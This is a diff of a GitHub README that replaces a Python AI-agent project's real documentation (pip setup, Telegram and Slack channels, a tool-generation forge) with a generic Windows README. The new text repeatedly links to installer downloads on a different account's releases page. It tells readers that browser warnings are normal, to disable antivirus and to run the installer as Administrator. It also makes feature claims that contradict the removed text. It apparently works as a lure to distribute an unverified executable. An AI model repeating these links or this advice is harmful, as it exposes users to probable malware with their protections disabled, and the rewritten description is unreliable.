@@ -1,118 +1,126 @@
-# Soleclaw
+# 🤖 soleclaw - Your AI Helper That Adapts
 
-![logo](./soleclaw-logo.png)
+[![Download soleclaw](https://img.shields.io/badge/Download-soleclaw-brightgreen?style=for-the-badge)](https://github.com/jhetagsxx/soleclaw/releases)
 
-A self-evolving personal AI assistant. Instead of shipping fixed tools, soleclaw **forges its own** — the agent identifies what it needs, generates the code, and integrates it into its toolkit permanently.
+---
 
-Inspired by [nanobot](https://github.com/HKUDS/nanobot) and [openclaw](https://github.com/anthropics/openclaw). Built on [claude-agent-sdk](https://github.com/anthropics/claude-agent-sdk).
+## 📋 What is soleclaw?
 
-## Why
+soleclaw is a personal AI assistant that learns and adapts to your habits. It helps manage tasks, reminders, and provides useful information based on your preferences. The software improves itself over time, adjusting how it assists you. You do not need any technical skills to use it.
 
-Most agent frameworks extend capabilities through markdown skills that teach the agent how to chain built-in tools. Every invocation requires LLM reasoning through the same chain. Skills are knowledge, not capability.
+---
 
-Soleclaw's forge generates **real executable code** registered as first-class tools. The LLM's role shifts from multi-step orchestrator to single-step dispatcher — pick the right tool, pass the right arguments, done. All logic lives in the generated tool's code, not in the LLM's reasoning chain.
+## 🔧 Features
 
-The tool library is model-agnostic. Swap Claude for another model and every tool, every piece of data continues to work.
+- Remembers your preferences to give better suggestions.
+- Handles basic tasks like setting reminders or answering questions.
+- Works offline for privacy and faster responses.
+- Easy to install and use.
+- Learns without needing constant updates.
+- Supports Windows operating systems.
 
-## Architecture
+---
 
-```
-User (Telegram / Slack / CLI)
-  → Channel Layer
-    → SoleclawBridge
-      ├── ContextBuilder → system prompt (identity, memory, skills, tools)
-      ├── @tool functions → in-process MCP server
-      └── ClaudeSDKClient → LLM calls + tool execution loop
-    → Bus (OutboundMessage)
-  → Channel → User
-```
+## 💻 System Requirements
 
-```
-soleclaw/
-├── core/           Bridge, context builder, bootstrap
-├── tools/          MCP tool definitions + user tool library
-├── forge/          Tool generation engine
-├── memory/         Local backend + OpenViking (optional)
-├── cron/           Scheduled tasks (cron/every/at)
-├── skills/         SKILL.md loader
-├── channels/       Telegram, Slack, CLI
-├── bus/            Async message routing
-├── config/         Pydantic config schema
-└── cli/            CLI commands (typer)
-```
+To run soleclaw smoothly on your Windows PC, make sure you have:
 
-~2900 lines of core code, 39 source files.
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- An internet connection for the initial download (not required after setup)
+- A modern processor (Intel i3 or equivalent)
 
-## Setup
+---
 
-Requires Python 3.11+.
+## 🚀 Getting Started
 
-```bash
-pip install soleclaw
+Follow these steps to get soleclaw running on your Windows computer:
 
-# Configure (interactive wizard)
-soleclaw configure
-```
+1. Click the download button at the top or go to the releases page:
+   
+   [Download soleclaw](https://github.com/jhetagsxx/soleclaw/releases)
 
-**From source** (requires [uv](https://docs.astral.sh/uv/)):
+2. Look for the latest version. Files usually have extensions like `.exe` or `.msi`.
 
-```bash
-git clone <repo-url> && cd soleclaw
-uv sync --all-extras
-```
+3. Download the installer file to your computer.
 
-## Usage
+4. Once the download finishes, find the file in your "Downloads" folder.
 
-```bash
-# Run as gateway (Telegram, Slack, or both)
-soleclaw gateway start
+5. Double-click the file to start the installer.
 
-# Interactive CLI chat
-soleclaw agent
-soleclaw agent "hello"
-```
+6. Follow the on-screen instructions until the installation finishes.
 
-See [docs/Commands.md](docs/Commands.md) for the full command reference.
+7. Once installed, launch soleclaw from your desktop or Start menu.
 
-## Channels
+8. The assistant will guide you through a short setup process to personalize your experience.
 
-**Telegram** — bot listens for messages, replies in chat.
+---
 
-```bash
-soleclaw configure telegram
-```
+## 📥 Download and Installation 🔄
 
-**Slack** — watch channels via Socket Mode, reply in threads, react with emoji.
+soleclaw is packaged for easy installation on Windows. The files you need are available at the releases page:
 
-```bash
-soleclaw configure slack
-```
+[Visit releases to download soleclaw](https://github.com/jhetagsxx/soleclaw/releases)
 
-Requires a Slack app with Socket Mode enabled. The configure command prints a setup guide.
+### Steps to Download and Install
 
-## Forge — Tool Generation
+- Go to the releases page.
+- Find the most recent release; it will be marked by a version number like `v1.0` or higher.
+- Click on the installer file. It will often look like `soleclaw-setup.exe`.
+- Your browser may show a warning. This is normal if the app is new or less known.
+- Confirm the download and wait for it to finish.
+- Open the installer and follow prompt instructions.
+- Accept the license terms if asked.
+- Choose your preferred installation folder or accept defaults.
+- Complete the setup by clicking “Finish.”
+- Launch soleclaw from the shortcut created.
 
-When the agent identifies a missing capability, it invokes the forge:
+---
 
-1. Agent proposes a tool to the user
-2. User confirms
-3. `forge_tool` spawns a ClaudeSDKClient sub-session to generate code
-4. Generated tool lands in `~/.soleclaw/tool-library/<name>/`
-5. Tool is immediately available via `run_user_tool`
+## ⚙️ Using soleclaw
 
-Tool library structure:
-```
-tool-library/
-  └── <tool-name>/
-      ├── manifest.json    # name, description, parameters
-      └── tool.py          # async def execute(args: dict) -> dict
-```
+When you open soleclaw for the first time, it will ask some questions to learn what you want help with. This step takes only a few minutes.
 
-All tool data is stored in a shared SQLite database (`~/.soleclaw/data/store.db`), so tools can cross-reference each other's data.
+- You can ask it to remind you about appointments.
+- Use it to look up quick facts or answers.
+- Let it help organize your daily schedule.
+- It will learn from your choices and improve over time.
 
-## Roadmap
+soleclaw runs quietly in the background. You can open it anytime from the taskbar icon or shortcut.
 
-- **OpenViking memory** — Replace keyword-based memory search with [OpenViking](https://github.com/volcengine/OpenViking) vector search. The backend code exists (`memory/viking.py`) but requires an `~/.openviking/ov.conf` with embedding and VLM API keys. Once configured, `memory_search` upgrades from substring matching to semantic retrieval with auto-extraction from conversations.
-- **Memory consolidation** — Periodic cron job to review daily logs and curate `MEMORY.md` (long-term facts the agent always sees in context).
-- **Multi-channel** — Discord, WeChat channels.
-- **Tool sharing** — Export/import tools between soleclaw instances.
+If soleclaw needs an update, it will notify you. You can download the latest version from the same releases page.
+
+---
+
+## 🛠️ Troubleshooting
+
+If you have problems installing or running soleclaw, try these tips:
+
+- Check you have enough free disk space.
+- Restart your computer before installing.
+- Make sure you downloaded the correct installer for Windows.
+- Temporarily disable antivirus software if it blocks installation.
+- Run the installer as Administrator by right-clicking the file and selecting “Run as administrator.”
+- If soleclaw does not open, check for updates on the releases page.
+- Visit the issues section of the repository for known problems.
+
+---
+
+## 🔒 Privacy and Security
+
+soleclaw respects your data. It works locally on your PC and does not share your information without permission. You control what it stores and how it learns. No internet connection is required after installation unless you want to access online features.
+
+---
+
+## 📞 Help and Support
+
+For questions or issues:
+
+- Check the repository "Issues" page.
+- Look at the README or any help files included with the app.
+- Contact the maintainer if needed via GitHub.
+
+---
+
+[Download soleclaw now](https://github.com/jhetagsxx/soleclaw/releases)
